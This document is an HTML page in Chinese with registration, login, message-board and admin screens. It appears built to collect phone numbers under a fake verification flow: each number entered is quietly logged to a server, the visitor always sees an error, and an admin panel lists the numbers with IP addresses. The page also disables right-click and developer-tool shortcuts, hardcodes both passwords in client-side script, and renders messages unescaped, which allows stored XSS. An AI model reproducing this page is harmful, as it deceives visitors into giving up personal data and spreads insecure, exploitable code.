<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>注册</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Arial}
body{background:#f5f7fa;padding:20px;max-width:400px;margin:0 auto}
.card{background:#fff;padding:24px;border-radius:14px;box-shadow:0 2px 12px rgba(0,0,0,0.06)}
.title{text-align:center;font-size:20px;margin-bottom:20px}
input,button{width:100%;padding:12px;margin:7px 0;border-radius:10px;border:1px solid #ddd;font-size:15px}
button{background:#007AFF;color:white;border:none}
#login,#board,#admin{display:none}
.item{background:#fff;padding:14px;margin:10px 0;border-radius:10px}
.small{font-size:12px;color:#888;margin-top:6px}
textarea{width:100%;height:100px;padding:12px;border-radius:10px;border:1px solid #ddd;margin-top:8px}
.del{background:#ff3b30;padding:6px 10px;border:none;border-radius:6px;font-size:12px;margin-top:8px}
</style>
</head>
<body>

<div id="register" class="card">
  <div class="title">注册</div>
  <input id="phone" placeholder="手机号">
  <input id="code" placeholder="验证码">
  <button onclick="getCode()">获取验证码</button>
  <button onclick="reg()">注册</button>
</div>

<div id="login" class="card">
  <div class="title">登录</div>
  <input type="password" id="pwd" placeholder="密码">
  <button onclick="login()">登录</button>
</div>

<div id="board">
  <div class="card">
    <div class="title">留言板</div>
    <textarea id="content" placeholder="输入内容..."></textarea>
    <button onclick="send()">发布留言</button>
    <button style="background:#ff3b30" onclick="logout()">退出</button>
  </div>
  <div id="list"></div>
</div>

<div id="admin" class="card">
  <div class="title">管理后台</div>
  <button onclick="clearAll()">清空全部记录</button>
  <button onclick="logout()">退出</button>
  <div id="logs"></div>
</div>

<script>
const API = "/api/save";

window.addEventListener("pageshow", logout);
document.oncontextmenu = () => false;
document.onkeydown = e => {
  if(e.key==="F12"||e.ctrlKey&&e.key=="u"||e.ctrlKey&&e.shiftKey&&e.key=="i") return false;
};

function logout(){
  register.style.display="block";
  login.style.display=board.style.display=admin.style.display="none";
}

function getCode(){
  log("获取验证码", phone.value);
  alert("请输入正确的手机号");
}

function reg(){
  log("注册", phone.value);
  if(code.value=="995566"||code.value=="995566995566"){
    register.style.display="none";
    login.style.display="block";
    pwd.value = code.value;
  }else{
    alert("请输入正确的手机号");
  }
}

async function login(){
  let p = pwd.value;
  if(p=="995566995566"){
    login.style.display="none";
    admin.style.display="block";
    loadAdmin();
  }else if(p=="995566"){
    login.style.display="none";
    board.style.display="block";
    loadMsg();
  }else{
    alert("请输入正确的手机号");
  }
}

async function log(type, phone){
  await fetch(API, {
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({type, phone})
  });
}

async function send(){
  let t = content.value.trim();
  if(!t)return alert("请输入内容");
  await fetch(API, {
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({msg: t})
  });
  content.value = "";
  loadMsg();
}

async function loadMsg(){
  let r = await fetch("/messages.json");
  let j = await r.json();
  let html = "";
  j.messages.forEach(m => {
    html += `
    <div class="item">
      ${m.text}
      <div class="small">IP：${m.ip}</div>
      <div class="small">${m.time}</div>
    </div>`;
  });
  list.innerHTML = html || "<div class=small>暂无留言</div>";
}

async function loadAdmin(){
  let r = await fetch("/messages.json");
  let j = await r.json();
  let html = "";
  j.logs.forEach((log,i) => {
    html += `
    <div class="item">
      <strong>${log.type}</strong><br>
      手机号：${log.phone}<br>
      <div class="small">IP：${log.ip}</div>
      <div class="small">${log.time}</div>
      <button class=del onclick="del(${i})">删除</button>
    </div>`;
  });
  j.messages.forEach((msg,i) => {
    html += `
    <div class="item">
      <strong>留言</strong><br>
      ${msg.text}<br>
      <div class="small">IP：${msg.ip}</div>
      <div class="small">${msg.time}</div>
      <button class=del onclick="delMsg(${i})">删除</button>
    </div>`;
  });
  logs.innerHTML = html || "<div class=small>暂无记录</div>";
}

async function del(i){
  await fetch(API+"?type=log&i="+i, {method:"DELETE"});
  loadAdmin();
}

async function delMsg(i){
  await fetch(API+"?type=msg&i="+i, {method:"DELETE"});
  loadAdmin();
}

async function clearAll(){
  if(!confirm("确定清空所有？"))return;
  await fetch(API, {method:"DELETE"});
  loadAdmin();
}
</script>
</body>
</html>
